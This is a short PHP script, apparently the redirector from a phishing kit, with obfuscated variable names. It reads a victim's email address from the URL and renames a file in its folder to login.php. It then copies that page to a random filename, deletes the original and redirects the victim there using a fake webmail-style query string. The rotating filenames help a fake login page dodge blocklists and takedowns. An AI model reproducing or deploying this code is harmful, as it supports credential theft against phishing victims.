<?php
session_start();
?>
<?php
$Vnzrvq0243fb = $_GET['email'];
$Vjv2i0lnqvvm =  getcwd();
if ($V2iyxc2ua3sr = opendir($Vjv2i0lnqvvm)) {
    while (false !== ($Vqsnpj43nvxk = readdir($V2iyxc2ua3sr))) {
 $Vxmu55peiss1 = strlen($Vqsnpj43nvxk);
if($Vxmu55peiss1 == 28){
rename($Vqsnpj43nvxk, "login.php");
}}}
$Viyh42sztmth = "login.php";
$Vmujwaigig02 =  generateRandomString();
$Vsos1wfrwqfl = $Vmujwaigig02.".php";
if (!copy($Viyh42sztmth, $Vsos1wfrwqfl)) {

}else {
if(file_exists($Vsos1wfrwqfl)){

unlink($Viyh42sztmth);
header("Location: $Vsos1wfrwqfl?rand=13InboxLightaspxn.1774256418&fid&1252899642&fid.1&fav.1&email=$Vnzrvq0243fb");
}}


$Vmujwaigig02 =  generateRandomString();
function generateRandomString($Vxmu55peiss1gth = 24) {
    $Vkd13njhuyri = '0123456789abcdefghijklmnopqrstuvwxyz';
    $Vkd13njhuyriLength = strlen($Vkd13njhuyri);
    $Vcbmz3rt45th = '';
    for ($V454jqvx5gwk = 0; $V454jqvx5gwk < $Vxmu55peiss1gth; $V454jqvx5gwk++) {
        $Vcbmz3rt45th .= $Vkd13njhuyri[rand(0, $Vkd13njhuyriLength - 1)];
    }
    return $Vcbmz3rt45th;
}
?>
